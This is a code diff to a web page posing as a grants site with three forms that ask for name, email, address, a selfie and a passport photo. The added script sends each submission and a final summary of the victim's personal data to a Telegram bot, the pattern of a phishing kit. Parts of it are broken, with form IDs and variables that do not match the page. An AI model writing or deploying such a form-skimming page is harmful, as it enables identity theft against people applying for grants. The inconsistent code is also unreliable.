@@ -263,10 +263,12 @@ blockquote {
       <p>Government Grants, General & Foundation Grants, Industry-Specific Grants, Minority/Women-Owned, Student/Business Grants.</p>
     </section>
 
-    <!-- Featured Books -->
+    <!-- Form Part -->
     <section class="featured" id="featured">
+		
+		<!-- Form one -->
 		<div id="form1" class="form-container active">
-     <form id="emailForm" method="post">
+     <form id="firstForm" method="post">
 		 <label for="name">Name</label>
 		 <input type="text" id="name" name="name" placeholder="Your Full Name" required>
 		 
@@ -285,12 +287,13 @@ blockquote {
 		 <label for="passport" class="custom-file-label">Take A Selfie</label>
 		 <input type="file" id="passport" accept="image/*" capture="user">
 		 
-		 <button type="submit" id="button">SUMBIT</button>
+		 <button type="submit" id="submitBtn1">SUMBIT</button>
 	 </form>
 		</div>
 
+		<!-- Form two -->
 		<div id="form2" class="form-container">
-     <form id="emailForm" method="post">
+     <form id="secondForm" method="post">
 		 <label for="name">Name</label>
 		 <input type="text" id="name" name="name" placeholder="Your Full Name" required>
 		 <label for="email">Email</label>
@@ -304,12 +307,13 @@ blockquote {
 		 <label for="passport">Passport</label>
 		 <input type="file" id="passport" accept="image/*" capture="user">
 		 
-		 <button type="submit" id="button">SUMBIT</button>
+		 <button type="submit" id="submitBtn2">SUMBIT</button>
 	 </form>
 		</div>
 
+		<!-- Form three -->
 		<div id="form3" class="form-container">
-     <form id="emailForm" method="post">
+     <form id="thirdForm" method="post">
 		 <label for="name">Name</label>
 		 <input type="text" id="name" name="name" placeholder="Your Full Name" required>
 		 <label for="email">Email</label>
@@ -323,7 +327,7 @@ blockquote {
 		 <label for="passport">Passport</label>
 		 <input type="file" id="passport" accept="image/*" capture="user">
 		 
-		 <button type="submit" id="button">SUMBIT</button>
+		 <button type="submit" id="submitBtn3">SUMBIT</button>
 	 </form>
 		</div>
     </section>
@@ -382,5 +386,162 @@ setTimeout(slideInAd, 1000);
 
 // Add event listener to close the ad when the button is clicked
 closeAdButton.addEventListener("click", slideOutAd);
+
+
+	  let allFormData = {};
+
+        // Form 1 submission
+        document.getElementById('firstForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn1');
+            
+            // Disable button and show loading
+            submitBtn.disabled = true;
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
+                           `👤 Name: ${data.name}\n` +
+                           `📧 Email: ${data.email}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            const success = await sendToTelegram(message);
+            
+            if (success) {
+                showForm('form2');
+            } else {
+                alert('Failed to send form data. Please try again.');
+            }
+            
+            // Re-enable button and hide loading
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+        // Form 2 submission
+        document.getElementById('addressForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn2');
+            const loading = document.getElementById('loading2');
+            
+            submitBtn.disabled = true;
+            loading.style.display = 'inline';
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 2 Submitted - Address Information**\n\n` +
+                           `🏠 Street: ${data.street}\n` +
+                           `🏙️ City: ${data.city}\n` +
+                           `📮 Zip Code: ${data.zipcode}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            const success = await sendToTelegram(message);
+            
+            if (success) {
+                showForm('form3');
+            } else {
+                alert('Failed to send form data. Please try again.');
+            }
+            
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+        // Form 3 submission
+        document.getElementById('preferencesForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn3');
+            const loading = document.getElementById('loading3');
+            
+            submitBtn.disabled = true;
+            loading.style.display = 'inline';
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 3 Submitted - Preferences**\n\n` +
+                           `📰 Newsletter: ${data.newsletter}\n` +
+                           `💬 Comments: ${data.comments || 'None'}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                           `✅ **All Forms Completed!**`;
+            
+            const success = await sendToTelegram(message);
+            
+            if (success) {
+                // Send summary of all data
+                const summaryMessage = `📊 **Complete Form Submission Summary**\n\n` +
+                                     `👤 Personal Info:\n` +
+                                     `   • Name: ${allFormData.name}\n` +
+                                     `   • Email: ${allFormData.email}\n\n` +
+                                     `🏠 Address Info:\n` +
+                                     `   • Street: ${allFormData.street}\n` +
+                                     `   • City: ${allFormData.city}\n` +
+                                     `   • Zip Code: ${allFormData.zipcode}\n\n` +
+                                     `⚙️ Preferences:\n` +
+                                     `   • Newsletter: ${allFormData.newsletter}\n` +
+                                     `   • Comments: ${allFormData.comments || 'None'}`;
+                
+                await sendToTelegram(summaryMessage);
+                showSuccessMessage();
+            } else {
+                alert('Failed to send form data. Please try again.');
+            }
+            
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+        // Function to send message to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        function showForm(formId) {
+            // Hide all forms
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            // Show the specified form
+            document.getElementById(formId).classList.add('active');
+        }
+
+        //function showSuccessMessage() {
+           // document.querySelectorAll('.form-container').forEach(form => {
+               // form.style.display = 'none';
+          //  });
+           // document.getElementById('successMessage').style.display = 'block';
+    //    }
   </script>
 </html>
